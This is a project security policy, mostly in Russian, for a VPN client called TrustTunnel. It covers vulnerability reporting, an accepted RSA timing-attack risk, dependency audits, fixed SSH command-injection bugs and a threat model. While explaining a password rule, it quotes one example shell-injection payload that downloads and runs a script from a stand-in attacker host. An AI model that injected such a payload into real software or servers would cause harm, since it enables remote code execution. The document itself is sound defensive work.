# Security Policy

## Supported Versions

| Version | Status | Security fixes |
|---------|--------|----------------|
| Pro v3.x | Active | ✅ |
| Pro v2.x | End of life | ❌ (только критичные, до 2026-09-01) |
| Light v2.x | Active | ✅ |

## Reporting Vulnerabilities

Если нашли security-проблему в TrustTunnel Client:

1. **Не создавайте public GitHub issue** — это даёт злоумышленникам шанс exploit до патча.
2. Напишите на **leftfilmsprod@gmail.com** с темой `[SECURITY] TrustTunnel Client — <краткое описание>`.
3. Ожидайте ответ в течение 72 часов. Если молчание больше 7 дней — можно эскалировать через Discord community.

Мы практикуем **coordinated disclosure**: вы сообщаете приватно, мы выпускаем патч + advisory, только потом раскрываем детали.

---

## Security Posture

TrustTunnel Client — VPN-клиент с двумя основными поверхностями атаки:

1. **SSH-управление сервером** (только Pro) — клиент подключается к VPS по SSH для установки/настройки TrustTunnel. Все команды формируются на клиенте, передаются через `russh`, интерполяция user-input требует санитизации.
2. **Локальный VPN-туннель** — sidecar-процесс `trusttunnel_client.exe` обрабатывает сетевой трафик через `wintun`. Привилегии администратора требуются для установки TUN-адаптера.

### Принципы

- **Zero hardcoded credentials** — все SSH/VPN credentials вводятся пользователем и хранятся в `%APPDATA%\TrustTunnel\config.toml` (plaintext — локальная защита за счёт ACL файловой системы)
- **Defense in depth** — frontend-валидация + backend-санитизация (см. `gui-app/src-tauri/src/ssh/sanitize.rs`)
- **No telemetry** — никаких данных наружу, кроме явных обновлений и запросов к GitHub Releases
- **D-29 invariant** (Phase 14 onward) — пароли **никогда** не попадают в activity log; spy-тесты проверяют это при каждой новой фиче
- **Char-whitelist validators** — все user-input валидаторы используют whitelist, не blacklist

---

## Known Security Issues

### RUSTSEC-2023-0071 — RSA Marvin Attack (accepted risk)

**Статус:** Known, accepted risk. No upstream fix available.

**Описание:** Криптографическая уязвимость в crate `rsa` 0.9.x — возможен timing side-channel при decryption. Теоретически позволяет восстановить private key при точном измерении времени многих операций.

**Где используется в проекте:** `russh` SSH-библиотека использует `rsa` для поддержки RSA-ключей. Путь: `trusttunnel → russh → rsa 0.9.10`.

**Практическая эксплуатируемость:** Низкая. Требует:
- MitM на сетевом уровне с точным контролем timing
- Использование пользователем **RSA SSH-ключа** для подключения (Ed25519/ECDSA не affected)
- Тысячи decryption операций за короткий период
- Прямой контакт с endpoint (не работает через промежуточные прокси с jitter)

**Mitigation:**
1. **Используйте Ed25519 или ECDSA SSH-ключи** — они не подвержены Marvin attack. `russh` полностью поддерживает оба алгоритма.
2. Избегайте переиспользования SSH-ключей между доверенными и недоверенными окружениями.
3. Не открывайте SSH-порт TrustTunnel сервера в публичный интернет — используйте firewall rules или VPN-tunnel.

**Почему не пофикшено:**
- RustCrypto/RSA upstream ещё не имеет constant-time implementation (сложная криптоинженерия).
- Альтернатива — замена `russh` на другой SSH-крейт — большой рефакторинг, vendor-lock.
- Индустриальный консенсус: для SSH-workflow Marvin attack имеет практически нулевую эксплуатируемость.

**Мониторинг:**
```bash
cd gui-app/src-tauri && cargo audit
```

Когда `rsa` crate выпустит constant-time fix — обновим немедленно.

---

## Supply Chain Security

Мы запускаем `cargo audit` и `npm audit` как часть prerelease проверки.

### Текущий статус (2026-04-18)

**Rust (`cargo audit`):**
- Vulnerabilities: **1** (rsa Marvin, accepted risk выше)
- Warnings: 23 (все — GTK3 bindings deprecated в Tauri 2 Linux-path; Windows-only билд не affected)

**Node (`npm audit`):**
- Регулярно проверяется в `prerelease` pipeline.

### История исправленных advisories (Phase 14.1)

| Advisory | Severity | Closed in commit |
|----------|----------|------------------|
| RUSTSEC-2026-0049 (rustls-webpki CRL auth) | — | `ab68cc01` |
| RUSTSEC-2026-0098 (rustls-webpki URI names) | — | `ab68cc01` |
| RUSTSEC-2026-0099 (rustls-webpki wildcard) | — | `ab68cc01` |
| RUSTSEC-2026-0044 (aws-lc-sys name constraints) | — | `76afe755` |
| RUSTSEC-2026-0048 (aws-lc-sys CRL logic) | **7.4 high** | `76afe755` |

---

## Phase 14.1 Security Hardening

Phase 14.1 расширил поверхность атаки (7 новых Tauri-команд, cert pinning, password rotation). Перед merge прошёл внутренний code review (`.planning/phases/14.1-*/14.1-REVIEW.md`) и автоматическое закрытие 11 findings (5 critical + 6 warning, см. `14.1-REVIEW-FIX.md`).

### Закрытые issues

| ID | Severity | Описание | Commit |
|----|----------|----------|--------|
| CR-01 | Critical | Cert pinning ABI mismatch — Vec<u8> serde → base64 string wire format | `86c3a070` |
| CR-02 | Critical | SSH command injection через displayName (только `"` экранировался) | `b2775be5` |
| CR-03 | Critical | SSH injection в password rotation (`"`, `$`, `` ` ``, `\`) | `5900d4d5` |
| CR-04 | Critical | Rules.toml substring collision (`alice` vs `alice_jr`) | `c86b062b` |
| CR-05 | Critical | UserConfig ABI mismatch (has_prefix bool vs client_random_prefix Option<String>) | `454bdf37` |
| WR-01..WR-06 | Warning | UserModal payload fixes + heredoc UUID delimiters + DnsUpstreams mid-text preservation | `454bdf37`, `68cfa6b1`, `6e74e72c` |

### Новые security invariants

1. **`validate_display_name`** в `sanitize.rs` — char-whitelist для TLV 0x0C field (отвергает `;`, `|`, `$`, `` ` ``, `&`, `\`, `(`, `)`, `\n`)
2. **`validate_vpn_password`** расширен — теперь отвергает `'`, `"`, `\` в дополнение к control chars
3. **UUID-based heredoc delimiters** — 4 SSH-сайта используют случайные `EOF_<uuid>` маркеры вместо статичных `USER_EOF` (защита от коллизии с пользовательским вводом)
4. **Base64 wire format для cert DER** — frontend и backend обмениваются `leaf_der_b64: String`, исключена serde-двусмысленность `Vec<u8>`
5. **In-flight invoke abort** в UserModal — `AbortController` отменяет запросы при закрытии модалки (защита от race conditions)

### User-facing breaking change (CR-03)

**Политика паролей** для VPN-пользователей теперь **запрещает `'`, `"`, `\`** помимо control chars.

- **Влияние:** Старые пароли, содержащие эти символы, не смогут пройти rotation — пользователь получит inline validation error.
- **Workaround:** Вручную создать нового пользователя с валидным паролем на сервере и удалить старого.
- **Почему:** Ранее backend heredoc с двойными кавычками позволял shell-injection через пароль (`$(curl evil.com/x.sh|bash)`).
- **Совместимость:** Встроенный `generatePassword()` использует только `[a-zA-Z0-9-_]`, так что UI-сгенерированные пароли всегда валидны.

---

## Threat Model Snapshot

### В scope

- SSH-command injection через любой user-input, интерполируемый в shell
- Race conditions между UI state и async backend invokes
- Credential leakage в logs, error messages, payloads
- Cert pinning integrity (malicious cert acceptance)
- TLV deeplink encoding tampering

### Out of scope (accepted)

- Memory attacks требующие local admin (мы уже running as admin)
- Windows-специфичные CVE в самом OS
- Side-channel attacks на crypto (см. rsa Marvin выше — тот же класс)
- Supply-chain атаки на `crates.io`/`npm` registry (trust в package ecosystem)
- Social engineering на пользователя SSH-credentials

---

## Verification Commands

Полная security-проверка:

```bash
# Backend (Rust)
cd gui-app/src-tauri
cargo audit                   # зависимости
cargo clippy --all-targets -- -D warnings   # статический анализ
cargo test                    # включая injection regression-тесты

# Frontend (Node)
cd gui-app
npm audit --production        # prod-зависимости
npm run typecheck             # TS strict mode
npm run lint                  # ESLint security плагины
npm run test                  # включая D-29 spy-тесты
```

---

## References

- [CLAUDE.md — Security Rules](CLAUDE.md) — для AI-агентов и разработчиков
- [.planning/phases/14.1-advanced-user-config-via-gear-icon-per-user-anti-dpi-prefix-/14.1-REVIEW.md](.planning/phases/14.1-advanced-user-config-via-gear-icon-per-user-anti-dpi-prefix-/14.1-REVIEW.md) — полный code review Phase 14.1
- [.planning/phases/14.1-advanced-user-config-via-gear-icon-per-user-anti-dpi-prefix-/14.1-REVIEW-FIX.md](.planning/phases/14.1-advanced-user-config-via-gear-icon-per-user-anti-dpi-prefix-/14.1-REVIEW-FIX.md) — отчёт по фиксам
- [RustSec Advisory Database](https://rustsec.org/)
- [RUSTSEC-2023-0071](https://rustsec.org/advisories/RUSTSEC-2023-0071) — Marvin attack details
